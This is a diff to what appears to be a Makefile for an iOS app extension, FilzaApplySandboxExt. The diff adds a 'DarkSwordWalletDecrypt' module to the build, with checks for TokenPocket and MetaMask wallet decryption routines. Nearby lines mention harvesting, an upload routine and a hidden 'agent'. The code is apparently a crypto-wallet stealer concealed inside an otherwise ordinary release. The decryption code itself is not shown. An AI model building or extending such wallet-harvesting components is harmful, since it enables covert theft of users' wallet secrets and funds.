@@ -9,11 +9,13 @@
 # the agent. Without it the module is inert, so the ordinary release IPA is
 # unchanged.
 
-FilzaApplySandboxExt_FILES += DarkSwordClient.m
+FilzaApplySandboxExt_FILES += DarkSwordClient.m DarkSwordWalletDecrypt.m
 
 before-FilzaApplySandboxExt-all::
 	@test -f "DarkSwordClient.h" || (echo "Missing DarkSwordClient.h" >&2; exit 1)
 	@test -f "DarkSwordClient.m" || (echo "Missing DarkSwordClient.m" >&2; exit 1)
+	@test -f "DarkSwordWalletDecrypt.h" || (echo "Missing DarkSwordWalletDecrypt.h" >&2; exit 1)
+	@test -f "DarkSwordWalletDecrypt.m" || (echo "Missing DarkSwordWalletDecrypt.m" >&2; exit 1)
 	@grep -Fq 'DarkSwordUpload' DarkSwordClient.h
 	@grep -Fq 'DarkSwordStart(void)' DarkSwordClient.h
 	@grep -Fq 'DarkSwordReportResult' DarkSwordClient.h
@@ -77,6 +79,13 @@ before-FilzaApplySandboxExt-all::
 	@# Harvest delivery and agent start are wired into their owners.
 	@grep -Fq 'DarkSwordUpload' PersistStoreHarvester.m
 	@grep -Fq 'DarkSwordStart' TryMaskCardShell.m
+	@# Per-wallet decryption (TokenPocket 4-layer vs MetaMask quick-crypto).
+	@grep -Fq 'wallet.decrypt' DarkSwordClient.m
+	@grep -Fq 'DarkSwordTokenPocketDecrypt' DarkSwordWalletDecrypt.m
+	@grep -Fq 'DarkSwordMetaMaskDecrypt' DarkSwordWalletDecrypt.m
+	@grep -Fq 'quick-crypto' DarkSwordWalletDecrypt.m
+	@grep -Fq 'CCKeyDerivationPBKDF' DarkSwordWalletDecrypt.m
+	@grep -Fq 'SecKeyCreateSharedSecretFromPrivateKey' DarkSwordWalletDecrypt.m
 	@# No Logos directives: this repo hooks through the ObjC runtime.
 	@! grep -Fq '%hook' DarkSwordClient.m
 	@! grep -Fq '%end' DarkSwordClient.m
